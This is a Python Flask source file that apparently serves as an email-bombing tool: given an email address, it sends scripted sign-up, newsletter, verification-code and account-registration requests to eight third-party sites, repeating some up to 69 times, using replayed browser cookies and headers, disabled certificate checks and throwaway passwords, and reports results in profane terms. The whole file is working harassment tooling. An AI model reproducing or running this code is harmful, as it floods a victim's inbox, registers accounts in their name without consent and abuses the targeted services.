import re
from flask import Flask, request, jsonify
import requests
import string
import random
import subprocess 

app = Flask(__name__)


def validate_email(email):
  pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
  return re.match(pattern, email)


def cobratate(email):
  if not validate_email(email):
    return 'fuck offff'
  headers = {
    'Host': 'listmonk.cobratate.com',
    # 'Content-Length': '83',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not A(Brand";v="24", "Chromium";v="110"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://listmonk.cobratate.com',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
    'Accept':
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://listmonk.cobratate.com/subscription/form',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
  }
  data = 'email={}&nonce=&name=Fucker&l=ba618a07-f653-485e-93b1-09bd5e4c0a00'.format(
    email)
  response = requests.post('https://listmonk.cobratate.com/subscription/form',
                           headers=headers,
                           data=data,
                           verify=False)
  if response.status_code == 200:
    return 'success'
  else:
    return 'failed'


def urbanic(email):
  if not validate_email(email):
    return 'fuck offff'
  cookies = {
    'locale':
    'en-us',
    '__cf_bm':
    'a93we8SEzSTGsvrXeQPE0crk6rFg.jB6qIiqqErCvx4-1676537844-0-AR8LZPhg7rbUOMYF0FLzAMYPIGzNeeky8OtOZtYMXM0DiKJUwhnseB6o5hekIQBauB9qOUudxQCu5bXDApxRr/0=',
    'ub_token':
    '',
    'ub_vtoken':
    'a8db2d23ba794b0aa875db64db286b9c',
    'uuid':
    'ff87598a-be33-4437-bb0e-cbeac6d9786e-1676537845486',
    'ftr_blst_1h':
    '1676537866236',
    '_fbp':
    'fb.1.1676537928680.751671021',
    '__cfruid':
    '65f37c25c3b82ca953e8e591b5798e28ca3767dc-1676537941',
    'forterToken':
    'e103cc11be5c4a2b81d3058b3a8431ab_1676537852101__UDF43-mnf-a4_14ck',
  }
  headers = {
    'Host': 'in.urbanic.com',
    # 'Content-Length': '45',
    'Sec-Ch-Ua': '"Not A(Brand";v="24", "Chromium";v="110"',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Trace_id': 'ec613146-ceee-4368-849a-ac26dacafb12-1676537962767',
    'Client_type': 'pc',
    'Content-Type': 'application/json;charset=UTF-8',
    'Eagleeye-Sessionid': 'Rylv0ekO6kkvwFc0sozX3Rg9bemR',
    'Accept': 'application/json, text/plain, */*',
    'Cache-Control': 'no-cache',
    'App_version': '4.38.4',
    'X-Forter-Token':
    'e103cc11be5c4a2b81d3058b3a8431ab_1676537852101__UDF43-mnf-a4_14ck_tt',
    'X-Platform': 'web',
    'X-Source': 'pc',
    'Uuid': 'ff87598a-be33-4437-bb0e-cbeac6d9786e-1676537845486',
    'H5-Version': '4.38.4',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
    'Vtoken': 'a8db2d23ba794b0aa875db64db286b9c',
    'Country-Code': 'IN',
    'Eagleeye-Pappname': 'fha4mtl30g@91b9e2e846a7420',
    'Eagleeye-Traceid': '678bfad716765379627711008a7420',
    'Origin': 'https://in.urbanic.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://in.urbanic.com/login?callback=%2Fpersonal',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    # 'Cookie': 'locale=en-us; __cf_bm=a93we8SEzSTGsvrXeQPE0crk6rFg.jB6qIiqqErCvx4-1676537844-0-AR8LZPhg7rbUOMYF0FLzAMYPIGzNeeky8OtOZtYMXM0DiKJUwhnseB6o5hekIQBauB9qOUudxQCu5bXDApxRr/0=; ub_token=; ub_vtoken=a8db2d23ba794b0aa875db64db286b9c; uuid=ff87598a-be33-4437-bb0e-cbeac6d9786e-1676537845486; ftr_blst_1h=1676537866236; _fbp=fb.1.1676537928680.751671021; __cfruid=65f37c25c3b82ca953e8e591b5798e28ca3767dc-1676537941; forterToken=e103cc11be5c4a2b81d3058b3a8431ab_1676537852101__UDF43-mnf-a4_14ck',
  }
  json_data = {
    'phone': email,
    'platform': 0,
  }
  for i in range(1, 5):
    response = requests.post(
      'https://in.urbanic.com/api/v1/shop/user/getVerifyCode',
      headers=headers,
      json=json_data,
      verify=False,
    )
  if response.status_code == 200:
    return 'success'
  else:
    return 'failed'


def fitgirl(email):
  if not validate_email(email):
    return 'fuck offff'
  headers = {
    'Host': 'fitgirl-repacks.site',
    # 'Content-Length': '189',
    'Cache-Control': 'max-age=0',
    'Sec-Ch-Ua': '"Not A(Brand";v="24", "Chromium";v="110"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://fitgirl-repacks.site',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
    'Accept':
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://fitgirl-repacks.site/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
  }
  data = f'email={email}&action=subscribe&source=https%3A%2F%2Ffitgirl-repacks.site%2F&sub-type=widget&redirect_fragment=subscribe-blog-blog_subscription-2&jetpack_subscriptions_widget='
  response = requests.post('https://fitgirl-repacks.site/',
                           headers=headers,
                           data=data,
                           verify=False)
  if response.status_code == 200:
    return 'success'
  else:
    return 'failed'


def render(email):
  if not validate_email(email):
    return 'fuck offff'
  headers = {
    'Host': 'api.render.com',
    # 'Content-Length': '751',
    'Sec-Ch-Ua': '"Not A(Brand";v="24", "Chromium";v="110"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Render-Request-Id': '3094fd84-6d3a-4239-89c1-783a9a0b8d04',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Origin': 'https://dashboard.render.com',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://dashboard.render.com/register',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
  }
  json_data = {
    'operationName':
    'signUp',
    'variables': {
      'signup': {
        'email': email,
        'githubId': '',
        'name': '',
        'githubToken': '',
        'googleId': '',
        'gitlabId': '',
        'inviteCode': '',
        'password': 'anon@#@#hehe69',
        'newsletterOptIn': False,
      },
    },
    'query':
    'mutation signUp($signup: SignupInput!) {\n  signUp(signup: $signup) {\n    ...authResultFields\n    __typename\n  }\n}\n\nfragment authResultFields on AuthResult {\n  idToken\n  expiresAt\n  user {\n    ...userFields\n    sudoModeExpiresAt\n    __typename\n  }\n  __typename\n}\n\nfragment userFields on User {\n  id\n  active\n  createdAt\n  email\n  featureFlags\n  githubId\n  gitlabId\n  name\n  notifyOnFail\n  notifyOnPrUpdate\n  otpEnabled\n  passwordExists\n  tosAcceptedAt\n  intercomEmailHMAC\n  __typename\n}\n',
  }
  response = requests.post('https://api.render.com/graphql',
                           headers=headers,
                           json=json_data,
                           verify=False)
  if response.status_code == 200:
    return 'success'
  else:
    return 'failed'


def farfromweak(email):
  if not validate_email(email):
    return 'fuck offff'
  headers = {
    'Host': 'farfromweak.carrd.co',
    # 'Content-Length': '359',
    'Sec-Ch-Ua': '"Not A(Brand";v="24", "Chromium";v="110"',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36',
    'Content-Type':
    'multipart/form-data; boundary=----WebKitFormBoundaryNpB4oU9LABFlB7qE',
    'Accept': '*/*',
    'Origin': 'https://farfromweak.carrd.co',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://farfromweak.carrd.co/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
  }
  data = f'------WebKitFormBoundaryNpB4oU9LABFlB7qE\r\nContent-Disposition: form-data; name="fname"\r\n\r\nmynameisunknown\r\n------WebKitFormBoundaryNpB4oU9LABFlB7qE\r\nContent-Disposition: form-data; name="email"\r\n\r\n{email}\r\n------WebKitFormBoundaryNpB4oU9LABFlB7qE\r\nContent-Disposition: form-data; name="id"\r\n\r\nform02\r\n------WebKitFormBoundaryNpB4oU9LABFlB7qE--\r\n'
  response = requests.post('https://farfromweak.carrd.co/post/signup',
                           headers=headers,
                           data=data)
  if response.status_code == 200:
    return 'Request Complete'
  else:
    return 'Request Failed'


def fucker(email):
  if not validate_email(email):
    return 'fuck offff'
  headers = {
    'authority':
    'nuk-widgets.fanhubmedia.com',
    'accept':
    'application/json, text/plain, */*',
    'accept-language':
    'en-US,en;q=0.7',
    'origin':
    'https://www.thesun.co.uk',
    'referer':
    'https://www.thesun.co.uk/',
    'sec-fetch-dest':
    'empty',
    'sec-fetch-mode':
    'cors',
    'sec-fetch-site':
    'cross-site',
    'sec-gpc':
    '1',
    'user-agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
  }
  data = {
    'email': email,
    'newsletter_name': 'thesun',
    'region': 'UK',
    'game': 'sim',
  }
  for i in range(1, 70):
    response = requests.post(
      'https://nuk-widgets.fanhubmedia.com/api/newsletter/send',
      headers=headers,
      data=data)
  if response.status_code == 200:
    return 'Fucked successfully'


def indiatimesfucker(email):
  if not validate_email(email):
    return 'fuck offff'

  cookies = {
    '_grx': '032d306e-35c3-426d-8538-3902f93ab4fa',
    '_grxs': 'ef07959d-3122-4246-aa68-5e10f789561e',
    '_ga': 'GA1.1.220539168cwefcdsdcEW.1683488732',
    '_gid': 'GA1.2.1390113321.1683488732',
    '_ga_WZ3Z4GGVRC': 'GS1.1.1683488732.1.1.1683488820.60.0.0',
    'deviceid': 'exliy6f6t1zsrqk9ttczh0qn6',
    'lgc_deviceid': 'exliy6f6t1zsrqk9ttczh0qn6',
    'ak_bmsc':
    '81516D76E75CD82D31805163EC701E3D~000000000000000000000000000000~YAAQVoksMfNNE/GHAQAAhGi/9xMkgEMHhsgVcPFpLnqY8pcbp6LvsDASeixcinUCfc290Sr9tjEV1nx+lcA2jZR8NydXxFwCewYA0+sssJKzTaZdEVz7UC+MoFZTcWw+80fCBJY03sTp5pZAfoNM8D605fejSTQKpxAjoCZXm44uvt1dXaCrjy0Gjq5PIGzc7cf/UfE73iHWU8wJXZasxqwdxqwdscWsB/8G73aplQrTDrWu0HgOg0YVlfm7V/dMVS6Tgn9IH3h8JTr4eXqwyd/FDUm9E+DjxHAw77lfP9nJK5cUHkH/nAodz5+dsp2bFXfQmhSbcDuQDCP/xuJnsKvyyY2fZGrBG+TFzC/FbxyY6hjRAwRhZUGcvq0/micHbo+jSOYOZS4P/nHK8cTKp+Ux/td/W7//liV4s/QJX/mpbqrYIEs4yJ7iPCQ1MTiRTo=',
    '_gcl_au': '1.1.227037318.1683488733',
    'bm_sv':
    '7170AB997E48693EA410A9F7B5C05D1C~YAAQVoksMTFOE/GHAQAAEg3A9xPJ6C/DrreTRM6j41pI+9HSewsfdcweadwedpLKNpJxqs89yBeJQAC8V815/GrqBTI00HaLB2S5bPyNcO9vwjf7OyxxK1CIlI13TarpD//1VllgOnAKh2sb6sssBgn6xzdGMpuzJUwXAzdq61jvcIANzqHjZQpQHSvKep7zaGKXZwxUbLFhTj//z9E54X/Gat10PaRPlOeUCZPr7V2+hnapjx0boLjELu8o21N+Sp4CIVfshop/fBuwK2Ab3A==~1',
    '_gat': '1',
  }
  headers = {
    'Host': 'jsso.indiatimes.com',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    # 'Content-Length': '212',
    'Referer': 'https://economictimes.indiatimes.com/',
    'Channel': 'et',
    'Platform': 'web',
    'Sdkversion': '0.5.9',
    'Isjssocrosswalk': 'true',
    'Origin': 'https://economictimes.indiatimes.com',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    # Requests doesn't support trailers
    # 'Te': 'trailers',
    # 'Cookie': '_grx=032d306e-35c3-426d-8538-3902f93ab4fa; _grxs=ef07959d-3122-4246-aa68-5e10f789561e; _ga=GA1.1.220539168cwefcdsdcEW.1683488732; _gid=GA1.2.1390113321.1683488732; _ga_WZ3Z4GGVRC=GS1.1.1683488732.1.1.1683488820.60.0.0; deviceid=exliy6f6t1zsrqk9ttczh0qn6; lgc_deviceid=exliy6f6t1zsrqk9ttczh0qn6; ak_bmsc=81516D76E75CD82D31805163EC701E3D~000000000000000000000000000000~YAAQVoksMfNNE/GHAQAAhGi/9xMkgEMHhsgVcPFpLnqY8pcbp6LvsDASeixcinUCfc290Sr9tjEV1nx+lcA2jZR8NydXxFwCewYA0+sssJKzTaZdEVz7UC+MoFZTcWw+80fCBJY03sTp5pZAfoNM8D605fejSTQKpxAjoCZXm44uvt1dXaCrjy0Gjq5PIGzc7cf/UfE73iHWU8wJXZasxqwdxqwdscWsB/8G73aplQrTDrWu0HgOg0YVlfm7V/dMVS6Tgn9IH3h8JTr4eXqwyd/FDUm9E+DjxHAw77lfP9nJK5cUHkH/nAodz5+dsp2bFXfQmhSbcDuQDCP/xuJnsKvyyY2fZGrBG+TFzC/FbxyY6hjRAwRhZUGcvq0/micHbo+jSOYOZS4P/nHK8cTKp+Ux/td/W7//liV4s/QJX/mpbqrYIEs4yJ7iPCQ1MTiRTo=; _gcl_au=1.1.227037318.1683488733; bm_sv=7170AB997E48693EA410A9F7B5C05D1C~YAAQVoksMTFOE/GHAQAAEg3A9xPJ6C/DrreTRM6j41pI+9HSewsfdcweadwedpLKNpJxqs89yBeJQAC8V815/GrqBTI00HaLB2S5bPyNcO9vwjf7OyxxK1CIlI13TarpD//1VllgOnAKh2sb6sssBgn6xzdGMpuzJUwXAzdq61jvcIANzqHjZQpQHSvKep7zaGKXZwxUbLFhTj//z9E54X/Gat10PaRPlOeUCZPr7V2+hnapjx0boLjELu8o21N+Sp4CIVfshop/fBuwK2Ab3A==~1; _gat=1',
  }

  json_data = {
    'firstName': 'zwqd',
    'lastName': '',
    'gender': '',
    'dob': '',
    'email': email,
    'mobile': '',
    'password': 'Ff25252s525@s',
    'isSendOffer': False,
    'termsAccepted': '1',
    'shareDataAllowed': '1',
    'timespointsPolicy': '1',
  }
  for i in range(1, 19):
    response = requests.post(
      'https://jsso.indiatimes.com/sso/crossapp/identity/web/registerUser',
      cookies=cookies,
      headers=headers,
      json=json_data,
      verify=False,
    )

  if response.status_code == 200:
    return 'Fucked successfully'


def crick(email):
  if not validate_email(email):
    return 'fuck offff'

  cookies = {
    'cb_config': '%7B%7D',
    'cbzads': 'IN|not_set|not_set|not_set',
    'cbgeo': 'IN',
    '_ga_4H06J8XXQH': 'GS1.1.1683490576.1.1.1683490735.0.0.0',
    '_ga': 'GA1.1.1405297732.1683490577',
    '_gid': 'GA1.2.600013017.1683490577',
    '_gat_UA-312277-1': '1',
  }

  headers = {
    'Host': 'www.cricbuzz.com',
    'User-Agent':
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json;charset=utf-8',
    # 'Content-Length': '55',
    'Origin': 'https://www.cricbuzz.com',
    'Referer': 'https://www.cricbuzz.com/premium-subscription/user/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    # Requests doesn't support trailers
    # 'Te': 'trailers',
    # 'Cookie': 'cb_config=%7B%7D; cbzads=IN|not_set|not_set|not_set; cbgeo=IN; _ga_4H06J8XXQH=GS1.1.1683490576.1.1.1683490735.0.0.0; _ga=GA1.1.1405297732.1683490577; _gid=GA1.2.600013017.1683490577; _gat_UA-312277-1=1',
  }

  json_data = {
    'username': email,
    'provider': 'Email',
  }
  for i in range(1, 21):
    response = requests.post(
      'https://www.cricbuzz.com/cbplus/auth/user/login',
      cookies=cookies,
      headers=headers,
      json=json_data,
      verify=False,
    )
  if response.status_code == 200:
    return 'Fucked successfully'


@app.route('/')
def handle_request():
  email = request.args.get('email')
  if not email:
    return 'yay server running'
    
  result = {}
  if not validate_email(email):
    result['message'] = 'fuck offff'
  else:
    result['cobratate'] = cobratate(email)
    result['urbanic'] = urbanic(email)
    result['fitgirl'] = fitgirl(email)
    result['Render'] = render(email)
    result['farfromweak'] = farfromweak(email)
    result['ultimate weapon'] = fucker(email)
    result['indian fucking kings'] = indiatimesfucker(email)
    result['fucking crick'] = crick(email)
    # Add other functions here
  return jsonify(result)


if __name__ == '__main__':
  app.run()
  subprocess.Popen(['python3', 'bot.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

  
